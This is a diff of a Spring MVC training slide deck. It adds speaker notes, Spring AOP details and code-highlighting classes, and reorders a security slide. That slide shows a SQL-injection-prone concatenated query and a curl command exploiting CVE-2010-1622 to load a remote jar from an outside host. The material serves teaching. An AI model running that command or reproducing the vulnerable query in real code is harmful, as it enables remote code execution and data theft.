@@ -37,6 +37,9 @@
 			<!-- Any section element inside of this container is displayed as a slide -->
 			<div class="slides">
 				<section>
+          <aside class="notes">
+            A little about myself...
+          </aside>
 					<h1>Spring MVC</h1>
 					<h3>Introduction</h3>
 					
@@ -63,7 +66,12 @@
 					<p>Remind us again about:</p>
 					<ul>
 					  <li>Auto-wiring (<code>@Autowire</code>)</li>
-					  <li>Aspect-Oriented Programming (AOP)</li>
+					  <li>Aspect-Oriented Programming (Spring AOP)
+              <ul>
+                <li>Dynamic proxies</li>
+                <li>CGLib</li>
+              </ul>
+            </li>
 					  <li>Classpath scanning</li>
 					  <li>JAXB (XML binding)</li>
 					</ul>
@@ -89,7 +97,7 @@
 					<ul>
 					  <li><em>Model</em><br/>Plain old Java classes (POJO)<br/>Per request or session</li>
 					  <li><em>View</em><br/>Pluggable, typically JSP pages, Freemarker or Velocity</li>
-					  <li><em>Controller</em><br/>Classpath-scanned <code>@Component</code>-annotated classes<br/>Singletons</li>
+					  <li><em>Controller</em><br/>Classpath-scanned <code>@Controller</code>-annotated classes<br/>Singletons</li>
 					</ul>
 				</section>
 
@@ -118,7 +126,8 @@ public class TodoItem {
 
 				<section>
 					<h2>An example JSP view</h2>
-					<p>Creating/editing a todo item 
+					<p>Creating/editing a todo item
+          (screenshot) 
 					<pre><code data-trim  contenteditable>
 &lt;h3&gt;Edit a todo item&lt;/h3&gt;
 &lt;form:form id="form" method="post" modelAttribute="item"&gt;
@@ -540,7 +549,7 @@ public class ExistingItemIDValidator
           <h2>Spring autowiring variants</h2>
           <ul>
             <li>Field injection
-              <pre><code data-trim>
+              <pre><code data-trim class="java">
 @Autowired private ItemService itemService;              
               </code></pre>
               <ul>
@@ -556,7 +565,7 @@ public class ExistingItemIDValidator
           <h2>Spring autowiring variants</h2>
           <ul>
             <li>Setter injection
-              <pre><code data-trim>
+              <pre><code data-trim class="java">
 private ItemService itemService;
 
 @Autowired 
@@ -579,7 +588,7 @@ public void setItemService(ItemService service) {
           <h2>Spring autowiring variants</h2>
           <ul>
             <li>Constructor injection
-              <pre><code data-trim>
+              <pre><code data-trim class="java">
 private ItemService itemService;
 
 @Autowired 
@@ -621,13 +630,17 @@ public MyService (ItemService service) {
         <section>
           <h2>Other security concerns</h2>
           <ul>
-            <li>SQL Injection
+            <li class="fragment">SQL Injection
             <pre><code data-trim contenteditable="true" class="java">
 jdbc.execute("SELECT FROM USERS WHERE name = '" + name +
              "' AND password = '" + password + "'");</code></pre>
             </li>
             
-            <li><a href="http://support.springsource.com/security/cve-2010-1622">Arbitrary code execution</a>
+            <li class="fragment">Denial of service attacks
+              (need not be an attack, maybe you're just popular)
+            </li>
+            
+            <li class="fragment"><a href="http://support.springsource.com/security/cve-2010-1622">Arbitrary code execution</a>
                 due to security bugs in Spring itself
             <pre><code data-trim contenteditable="true" class="bash">
 curl --data "class.classLoader.URLs[0]=jar:http://dl.com/dino.jar!/" \
@@ -635,9 +648,6 @@ curl --data "class.classLoader.URLs[0]=jar:http://dl.com/dino.jar!/" \
             </code></pre>
             </li>
                 
-            <li>Denial of service attacks
-              (need not be an attack, maybe you're just popular)
-            </li>
           </ul>
         </section>
 
